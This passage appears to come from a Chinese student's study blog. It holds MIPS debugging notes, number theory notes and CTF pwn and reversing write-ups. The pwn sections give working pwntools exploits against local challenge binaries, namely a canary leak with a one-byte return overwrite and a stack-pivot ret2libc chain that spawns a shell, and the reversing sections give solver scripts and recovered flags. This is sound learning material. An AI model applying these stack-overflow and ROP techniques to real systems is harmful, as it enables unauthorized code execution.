class="hljs-number">0</span>x7F68(<span class="hljs-variable">$gp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000000120003</span>C2C                 ld      <span class="hljs-variable">$a0</span>, -<span class="hljs-number">0</span>x7F78(<span class="hljs-variable">$gp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000000120003</span>C30                 ld      <span class="hljs-variable">$a1</span>, -<span class="hljs-number">0</span>x7F58(<span class="hljs-variable">$gp</span>)<br></code></pre></td></tr></table></figure>
<p>如下面的代码片段，bc1f是跳转指令，满足条件跳转至 loc_120003B24 。无论是否满足跳转条件，都会先执行 ld $t9, -0x7F68($gp) 那条指令，再跳到 loc_120003B24 或者 ld $a0, -0x7F78($gp) 。gdb断点只能下到 0x120003C24 或 0x120003C2C，无法下到0x120003C28。<br>当然平时调试的时候也能多注意像$a0这样的<br>因为mips调用函数的参数往往放在这<br>而像这样的寄存器往往存着你的输入<br>好了mips暂且告一段落。。。</p>
<h1 id="pwn-learning"><a href="#pwn-learning" class="headerlink" title="pwn_learning"></a>pwn_learning</h1><h2 id="stack-smash"><a href="#stack-smash" class="headerlink" title="stack_smash"></a>stack_smash</h2><p>有canary情况下可以使用<br>但是只能达成任意地址读写</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sqf">void <span class="hljs-variable">__attribute__</span> ((noreturn)) <span class="hljs-variable">__stack_chk_fail</span> (void)<br>&#123;<br>  <span class="hljs-variable">__fortify_fail</span> (<span class="hljs-string">&quot;stack smashing detected&quot;</span>);<br>&#125;<br>void <span class="hljs-variable">__attribute__</span> ((noreturn)) internal_function <span class="hljs-variable">__fortify_fail</span> (const char *msg)<br>&#123;<br>  <span class="hljs-comment">/* The loop is added only to keep gcc happy.  */</span><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    <span class="hljs-variable">__libc_message</span> (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>,<br>                    msg, <span class="hljs-variable">__libc_argv</span>[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>主要原理就是覆盖argv[0]为你想读出的地址<br>具体可见jarvisoj的smash<br>当然这题还涉及到了elf的映射<br>bss段会被映射俩次<br>在pwndbg中使用search ‘xxx’就行啦</p>
<h2 id="partial-overwrite"><a href="#partial-overwrite" class="headerlink" title="partial overwrite"></a>partial overwrite</h2><p>例题是安恒杯月赛的babypie<br>这边涉及到的知识点比如说read函数不补\0<br>外加上printf所以我们可以leak canary<br>还有就是off by one<br>程序开启了pie但是保存的返回地址与后门函数只有最后一字节不同<br>所以可以off by one<br><img src="3.png" srcset="/img/loading.gif" lazyload alt="3"><br>可以看到输入40个a后<br>canary结尾处是0<br>我们可以输入41个覆盖0<br>这样就能把canary打出</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br><span class="hljs-keyword">a</span> = <span class="hljs-built_in">process</span>(<span class="hljs-string">&quot;./babypie&quot;</span>)<br>pay = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">41</span><br><span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;Name:&quot;</span>)<br><span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(pay)<br><span class="hljs-keyword">a</span>.recvuntil(pay)<br>canary = <span class="hljs-string">&#x27;\0&#x27;</span> + <span class="hljs-keyword">a</span>.recv(<span class="hljs-number">7</span>)<br>pay2 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + canary + <span class="hljs-string">&#x27;bbbbbbbb&#x27;</span> + chr(<span class="hljs-number">0x3e</span>)<br><span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(pay2)<br><span class="hljs-keyword">a</span>.interactive()<br></code></pre></td></tr></table></figure>
<h2 id="frame-faking"><a href="#frame-faking" class="headerlink" title="frame faking"></a>frame faking</h2><p>看着头疼的东西<br>睡前写一波<br>大致原理已经搞得差不多了<br>主要是溢出位数不够构造ebp进行俩次leave ret<br>为什么要俩次leave ret？<br>其实目的是让你构造得ebp赋值给esp<br>然后esp改变，第二次ret得地址就为esp那边的了<br>假如说我们把构造的ebp整到一个我们可控得内存区域<br>这样就能劫持控制流了<br>当然frame faking有个使用前提<br>一个是知道栈地址，还有就是能栈溢出且有一块写的内存区域<br>和劫持栈指针有点相似<br>明天再把题目整一下<br>花式栈溢出即将完结~~~<br>撒花~~~</p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>安恒杯的over</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">p_r</span> = <span class="hljs-number">0</span>x<span class="hljs-number">400793</span><br><span class="hljs-attribute">elf</span> = ELF(<span class="hljs-string">&quot;./over&quot;</span>)<br><span class="hljs-attribute">libc</span> = elf.libc<br><span class="hljs-attribute">a</span> = process(<span class="hljs-string">&quot;./over&quot;</span>)<br><span class="hljs-attribute">pay</span> = &#x27;a&#x27;*<span class="hljs-number">80</span><br><span class="hljs-attribute">a</span>.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br><span class="hljs-attribute">a</span>.send(pay)<br><span class="hljs-attribute">a</span>.recvuntil(&#x27;a&#x27;*<span class="hljs-number">80</span>)<br><span class="hljs-attribute">fake</span> = u<span class="hljs-number">64</span>(a.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>: ].ljust(<span class="hljs-number">8</span>, &#x27;\<span class="hljs-number">0</span>&#x27;)) - <span class="hljs-number">0</span>x<span class="hljs-number">70</span><br><span class="hljs-attribute">a</span>.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br><span class="hljs-attribute">pay</span>  = &#x27;<span class="hljs-number">11111111</span>&#x27; + p<span class="hljs-number">64</span>(p_r) + p<span class="hljs-number">64</span>(elf.got[&#x27;puts&#x27;]) + p<span class="hljs-number">64</span>(elf.symbols[&#x27;puts&#x27;]) + p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>x<span class="hljs-number">400676</span>)<br><span class="hljs-attribute">pay</span> += &#x27;a&#x27;*(<span class="hljs-number">0</span>x<span class="hljs-number">50</span>-len(pay))<br><span class="hljs-attribute">pay</span> += p<span class="hljs-number">64</span>(fake)<br><span class="hljs-attribute">pay</span> += p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>x<span class="hljs-number">4006</span>BE)<br><span class="hljs-attribute">a</span>.send(pay)<br><span class="hljs-attribute">print</span> &#x27;dividing line&#x27;<br><span class="hljs-attribute">base</span> = u<span class="hljs-number">64</span>(a.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>: ].ljust(<span class="hljs-number">8</span>, &#x27;\<span class="hljs-number">0</span>&#x27;)) - libc.sym[&#x27;puts&#x27;]<br><span class="hljs-attribute">sys</span> = libc.symbols[&#x27;execve&#x27;] + base<br><span class="hljs-attribute">sh</span> = libc.search(&#x27;/bin/sh&#x27;).next() + base<br><span class="hljs-attribute">p_p_r</span> = <span class="hljs-number">0</span>x<span class="hljs-number">1150</span>c<span class="hljs-number">9</span> + base<br><span class="hljs-attribute">pay2</span> = &#x27;<span class="hljs-number">22222222</span>&#x27;<br><span class="hljs-attribute">pay2</span> += p<span class="hljs-number">64</span>(p_r) + p<span class="hljs-number">64</span>(sh)<br><span class="hljs-attribute">pay2</span> += p<span class="hljs-number">64</span>(p_p_r) + p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>) + p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>)<br><span class="hljs-attribute">pay2</span> += p<span class="hljs-number">64</span>(sys)<br><span class="hljs-attribute">pay2</span> += &#x27;b&#x27;*(<span class="hljs-number">80</span>-len(pay<span class="hljs-number">2</span>))<br><span class="hljs-attribute">pay2</span> += p<span class="hljs-number">64</span>(fake-<span class="hljs-number">0</span>x<span class="hljs-number">30</span>)<br><span class="hljs-attribute">pay2</span> += p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>x<span class="hljs-number">4006</span>BE)<br><span class="hljs-attribute">a</span>.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br><span class="hljs-attribute">print</span> &#x27;****************&#x27;<br><span class="hljs-attribute">print</span> hex(fake)<br><span class="hljs-attribute">print</span> &#x27;****************&#x27;<br><span class="hljs-attribute">print</span> hex(base)<br><span class="hljs-attribute">a</span>.send(pay<span class="hljs-number">2</span>)<br><span class="hljs-attribute">a</span>.interactive()<br></code></pre></td></tr></table></figure>
<p>这题配合了ret2libc<br>写完后从原理上面想了想确实和劫持栈指针一个样。。。</p>
<h1 id="信安数基学习"><a href="#信安数基学习" class="headerlink" title="信安数基学习"></a>信安数基学习</h1><p>信安数基这玩意其实感觉特别重要啊<br>和密码学有点链接，大一的时候看过点密码学书，感觉能看懂原理但是不能深入理解毕竟涉及到了大部分的数学知识<br>正好趁着暑假学习一下</p>
<h2 id="整除-amp-性质"><a href="#整除-amp-性质" class="headerlink" title="整除&amp;性质"></a>整除&amp;性质</h2><p>简记b|a为b整除a<br>性质1：b与-b，a/b都遍历了a的因数<br>性质2：传递性 比如abc!=0,且都为整数，有b|a,c|b,则c|a<br>当然在加法运算中这也成立<br>b|a,b|c,所以b|(a+-c)<br>性质3：线性性质<br>c|a,c|b对于任意整数s，t有 c|s<em>a+t</em>b<br>这边还能推广为多个线性组合就不写出来了</p>
<h2 id="素数与厄拉托塞师筛法"><a href="#素数与厄拉托塞师筛法" class="headerlink" title="素数与厄拉托塞师筛法"></a>素数与厄拉托塞师筛法</h2><p>前面这一部分都不怎么难。。。简单讲讲<br>素数什么的就不介绍了<br>这一章涉及的大部分都在大一上c语言见过<br>比如不小于n的素数啊<br>就是从小于等于根号n开始<br>定理1：设n为正合数，p是n的一个大于1的最小正因数，则p一定是素数且p&lt;=根号n<br>定理2：对于正整数n，如果对于所有素数p&lt;=根号n都有p|n,则n为素数<br>定理3：素数有无穷多个</p>
<h2 id="欧几里得除法-amp-素数平凡判别"><a href="#欧几里得除法-amp-素数平凡判别" class="headerlink" title="欧几里得除法&amp;素数平凡判别"></a>欧几里得除法&amp;素数平凡判别</h2><p>定理：对于a,b俩个整数，其中b大于0，则存在唯一的整数q,r使得 a = q*b + r,  (0 &lt;= r &lt; b)<br>所以b|a &lt;=&gt; r = 0<br>很明显q是a被b除的不完全商，r是余数<br>C语言中的/ 和 %的结果。。。<br>定义：即[x]为整数部分小于等于x的最大整数<br>所以q就可以用[a/b]来表示<br>素数的平凡判别简单来说就是对于正整数n，把小于等于根号n的素数s全拿出来<br>如果n%s != 0对所有s都成立<br>则n为素数</p>
<h2 id="最大公因数-amp-广义欧几里得除法"><a href="#最大公因数-amp-广义欧几里得除法" class="headerlink" title="最大公因数&amp;广义欧几里得除法"></a>最大公因数&amp;广义欧几里得除法</h2><p>大部分都学过<br>注意一个就是 对于 a = q<em>b + c 有(a,b) = (b,c)<br>广义欧几里得除法就是用来求解最大公因数的通过递归可以实现<br>比如求a,b得最大公因数<br>a = c</em>b + r<br>b = c1<em>r + r1<br>r = c2</em>r1<br>所以最大公因数是r1<br>//可以轻松编程实现</p>
<h2 id="贝祖等式"><a href="#贝祖等式" class="headerlink" title="贝祖等式"></a>贝祖等式</h2><p>s<em>a + t</em>b = (a,b)<br>其实就是把广义欧几里得除法反过来用<br>互素的话则值为1</p>
<h2 id="最大公因数的进一步性质"><a href="#最大公因数的进一步性质" class="headerlink" title="最大公因数的进一步性质"></a>最大公因数的进一步性质</h2><p>大致就是涉及到多个整数最大公因数计算</p>
<h2 id="整数的进一步性质和最小公倍数"><a href="#整数的进一步性质和最小公倍数" class="headerlink" title="整数的进一步性质和最小公倍数"></a>整数的进一步性质和最小公倍数</h2><p>任意整数都可以化为若干素数的乘积<br>其实如果不是素数的话，那个数也能继续化简，稍微想下就可以得到</p>
<h2 id="同余"><a href="#同余" class="headerlink" title="同余"></a>同余</h2><p>同余和取模有关啦<br>密码学中也有讲到这一概念<br>a = b + q*m<br>就有 a%m = b%m<br>还有许多推论如 整数n被3整除 同余 系数和被三整除</p>
<h1 id="VM逆向"><a href="#VM逆向" class="headerlink" title="VM逆向"></a>VM逆向</h1><p>以前vm一直是用angr啥的骚操作来解决的<br>这个坑必须填一下<br>这次来试一下手逆</p>
<h2 id="RCTF-2018"><a href="#RCTF-2018" class="headerlink" title="RCTF 2018"></a>RCTF 2018</h2><p>很带劲啊这题<br>先是跟了半天的vm然后发现他在打出input the flag<br>。。。<br><img src="6.png" srcset="/img/loading.gif" lazyload alt="6"><br>可以看到case 0xb就是putchar<br>录入flag就是在case 0xa那边了，因为用的是getchar所以调试一波可以发现输入的flag长度<br>应该为32<br>然后程序对它进行了异或操作。。。<br>这边的异或实现形式有点奇葩<br>c = ~(a&amp;b)<br>temp1 = ~(c&amp;a)<br>temp2 = ~(c&amp;b)<br>a^b = ~(temp1&amp;temp2)<br>没错就是这样的。。。<br>至于这是xor证明起来也不难<br>直接枚举一下//一开始我也没有想到这个方法，听室友说的<br>然后会有个验证，验证就是个if分支判断<br><img src="7.png" srcset="/img/loading.gif" lazyload alt="7"><br>如果输入是错的直接就putchar wrong</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">a = [<span class="hljs-number">9</span>,<span class="hljs-number">0</span>x58,<span class="hljs-number">0</span>xc,<span class="hljs-number">0</span>xa,<span class="hljs-number">0</span>x5f,<span class="hljs-number">0</span>x58,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>x5a,<span class="hljs-number">0x56,0x5</span>,<span class="hljs-number">0x53,0x51</span>,<span class="hljs-number">0</span>x<span class="hljs-number">57,1,0x54</span>,<span class="hljs-number">0x53,0x18</span>,<span class="hljs-number">0x48,0x49</span>,<span class="hljs-number">0</span>x1f,<span class="hljs-number">0</span>x12,<span class="hljs-number">0</span>x4b,<span class="hljs-number">0</span>x1d,<span class="hljs-number">0x10,0x17</span>,<span class="hljs-number">0x40,0x47</span>,<span class="hljs-number">0x15,0x14</span>,<span class="hljs-number">0x43,0x18</span>,<span class="hljs-number">0</span>x10]<br>flag = &#x27;&#x27;<br>for i in range(len(a)):<br>    flag += chr(a[len(a)-<span class="hljs-number">1</span>-i]^(<span class="hljs-number">0</span>x20+i))<br>print flag<br></code></pre></td></tr></table></figure>
<p>最后的脚本。。。<br>第一次写vm<br>属实笨比</p>
<h1 id="De1CTF-2019"><a href="#De1CTF-2019" class="headerlink" title="De1CTF 2019"></a>De1CTF 2019</h1><h2 id="Re-Sign"><a href="#Re-Sign" class="headerlink" title="Re_Sign"></a>Re_Sign</h2><p>UPX加壳<br>脱完后发现。。。。。。<br>代码量极其长//那时候还不知道是易语言写的<br>跟了一会发现就是个改了码表的base64<br>sub_401233解密码表<br>后面把加密后的下标与正确下标相比较</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go">a = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span><br>b = <span class="hljs-string">&#x27;0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&#x27;</span><br>c = <span class="hljs-string">&#x27;H6AfGzIeXjSCP3IaHzSBHhRCEFRCOhRWHAohFjxjOeqjCU&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i in <span class="hljs-keyword">range</span>(<span class="hljs-built_in">len</span>(c)):<br>    <span class="hljs-keyword">for</span> j in <span class="hljs-keyword">range</span>(<span class="hljs-built_in">len</span>(a)):<br>        <span class="hljs-keyword">if</span> c[i] == b[j]:<br>            flag += a[j]<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span> flag<br></code></pre></td></tr></table></figure>
<p>解一下base64即可</p>
<h2 id="Cplusplus"><a href="#Cplusplus" class="headerlink" title="Cplusplus"></a>Cplusplus</h2><p>hint里面有md5很明显这又是一道多解题<br>总共4次check<br>中间有time反调试<br>第一次check是sub_140005910<br>主要是检查是否是数字+@+数字+#+数字<br>第二次是sub_1400029B0<br>判断第一段数字是否合格<br>首先会有个大小判断<br><img src="4.png" srcset="/img/loading.gif" lazyload alt="4"><br>判断是否大于111大于就gg<br>然后下面是根据输入的一个判断<br>因为懒。。。这边我直接爆破<br>也就111次，最后发现应该输入为78<br>多解就出现在这边。。。可以输入078，78，0078啥的<br>然后就是下面的check，很简单就是比较下标而已<br><img src="5.png" srcset="/img/loading.gif" lazyload alt="5"><br>这边的反调试被我patch掉了<br>第二段数字应该是20637<br>然后就是第三段<br>if ( WORD2(v51) % (unsigned int)(unsigned __int16)v51 != 12 &amp;&amp; WORD2(v51) / (unsigned int)(unsigned __int16)v51 != 3 )<br>这边就是第三段的check<br>z3写一下完事<br>发现应该是114<br>所以flag<br>de1ctf{78@20637#114}</p>
<h2 id="Evil-boost"><a href="#Evil-boost" class="headerlink" title="Evil_boost"></a>Evil_boost</h2><p>沙雕题<br>中间还放了假flag<br>是个算24点<br>输入限制为5数字一小写字母，小写字母放在第二个必须是e//这个是在某个代码段中看到的，但是不是e也能过，可以说十分沙雕<br>还有5填充符可以用/()-*<br>这时候就能猜测是不是再算什么东西了。。。<br>最后猜到了24点</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">import</span> string<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">crackMd5</span>(<span class="hljs-params">dst</span>):</span><br>    dst = dst.lower()<br><br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):<br><br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):<br><br>            <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):<br><br>                <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):<br><br>                    <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):<br><br>                        word = <span class="hljs-string">&#x27;de1ctf&#123;&#x27;</span> + <span class="hljs-built_in">str</span>(a) + <span class="hljs-string">&#x27;e&#x27;</span> + <span class="hljs-built_in">str</span>(b) + <span class="hljs-string">&#x27;*(&#x27;</span> + <span class="hljs-built_in">str</span>(c) + <span class="hljs-string">&#x27;-&#x27;</span> + <span class="hljs-built_in">str</span>(d) + <span class="hljs-string">&#x27;/&#x27;</span> + <span class="hljs-built_in">str</span>(e) + <span class="hljs-string">&#x27;)&#125;&#x27;</span><br><br>                        tmp = hashlib.md5(word).hexdigest()<br><br>                        <span class="hljs-keyword">if</span> dst == tmp:<br>                            <span class="hljs-keyword">return</span> word<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    raw_input(crackMd5(<span class="hljs-string">&quot;293316bfd246fa84e566d7999df88e79&quot;</span>))<br></code></pre></td></tr></table></figure>
<p>最后还是靠着爆破写出来的</p>
<h2 id="Signal-vm"><a href="#Signal-vm" class="headerlink" title="Signal vm"></a>Signal vm</h2><p>学长写的，写完后复现了发我<br>发现就是个矩阵求解问题</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"># -*- coding: UTF-<span class="hljs-number">8</span> -*-<br>from z3 import *<br>a = [<span class="hljs-number">65</span>, <span class="hljs-number">108</span>, <span class="hljs-number">109</span>, <span class="hljs-number">111</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">32</span>, <span class="hljs-number">104</span>, <span class="hljs-number">101</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">101</span>, <span class="hljs-number">110</span>, <span class="hljs-number">32</span>, <span class="hljs-number">119</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">32</span>, <span class="hljs-number">118</span>, <span class="hljs-number">105</span>, <span class="hljs-number">114</span>, <span class="hljs-number">103</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">105</span>, <span class="hljs-number">97</span>, <span class="hljs-number">44</span>, <span class="hljs-number">32</span>, <span class="hljs-number">98</span>, <span class="hljs-number">108</span>, <span class="hljs-number">117</span>, <span class="hljs-number">101</span>, <span class="hljs-number">32</span>, <span class="hljs-number">114</span>, <span class="hljs-number">105</span>, <span class="hljs-number">100</span>, <span class="hljs-number">103</span>, <span class="hljs-number">101</span>, <span class="hljs-number">32</span>, <span class="hljs-number">109</span>, <span class="hljs-number">111</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">97</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">115</span>, <span class="hljs-number">0</span>]<br>b = [<span class="hljs-number">0xD6</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x88</span>,<br>  <span class="hljs-number">0x86</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x26</span>,<br>  <span class="hljs-number">0x83</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xCE</span>,<br>  <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xC8</span>,<br>  <span class="hljs-number">0x75</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xD8</span>,<br>  <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0xF1</span>,<br>  <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x51</span>]<br>s = Solver()<br>key = [BitVec(<span class="hljs-string">&#x27;u%d&#x27;</span>%i,<span class="hljs-number">8</span>) for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">70</span>)]<br>for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):<br>    for j <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):<br>        s<span class="hljs-number">.</span><span class="hljs-keyword">add</span>(b[i*<span class="hljs-number">7</span>+j] == key[i*<span class="hljs-number">7</span>]*a[j]+key[i*<span class="hljs-number">7</span>+<span class="hljs-number">1</span>]*a[<span class="hljs-number">7</span>*<span class="hljs-number">1</span>+j]+key[i*<span class="hljs-number">7</span>+<span class="hljs-number">2</span>]*a[<span class="hljs-number">7</span>*<span class="hljs-number">2</span>+j]+key[i*<span class="hljs-number">7</span>+<span class="hljs-number">3</span>]*a[<span class="hljs-number">7</span>*<span class="hljs-number">3</span>+j]+key[i*<span class="hljs-number">7</span>+<span class="hljs-number">4</span>]*a[<span class="hljs-number">7</span>*<span class="hljs-number">4</span>+j]+key[i*<span class="hljs-number">7</span>+<span class="hljs-number">5</span>]*a[<span class="hljs-number">7</span>*<span class="hljs-number">5</span>+j]+key[i*<span class="hljs-number">7</span>+<span class="hljs-number">6</span>]*a[<span class="hljs-number">7</span>*<span class="hljs-number">6</span>+j])<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-string">if s.check() == sat:</span><br><span class="hljs-string">    result = s.model()</span><br><span class="hljs-string">    for i in range(70):</span><br><span class="hljs-string">        flag += chr(result[key[i]].as_long().real)</span><br><span class="hljs-string">    print flag</span><br></code></pre></td></tr></table></figure>
<h1 id="sctf-2019"><a href="#sctf-2019" class="headerlink" title="sctf 2019"></a>sctf 2019</h1><p>sctf因为在考试周所以没打。。。<br>//导致现在xctf联赛要凉了<br>抽时间把题目搞一搞<br>还好当时保存下来了</p>
<h2 id="crackme"><a href="#crackme" class="headerlink" title="crackme"></a>crackme</h2><p>这题当时没写出来是吧关键的函数给直接patch了。。。<br><img src="13.png" srcset="/img/loading.gif" lazyload alt="13"><br>前俩个函数，涉及了最后匹配的密文修改，我以为是反调试直接给patch了<br>然后gg<br><img src="14.png" srcset="/img/loading.gif" lazyload alt="14"><br>后面就是一个aes cbc模式直接解密就完事了<br>这边学习一波seh异常处理<br>debugbreak没有在调试下的话会抛出异常，然后seh跳过去<br>如果在调试状态下的话就会继续运行。。。<br>//类似反调试了<br><img src="15.png" srcset="/img/loading.gif" lazyload alt="15"><br>跳过去后就是一些smc操作<br>nKnbHsgqD3aNEB91jB3gEzAr+IklQwT1bSs3+bXpeuo=<br>aes解得<br>sctf{Ae3_C8c_I28_pKcs79ad4}</p>
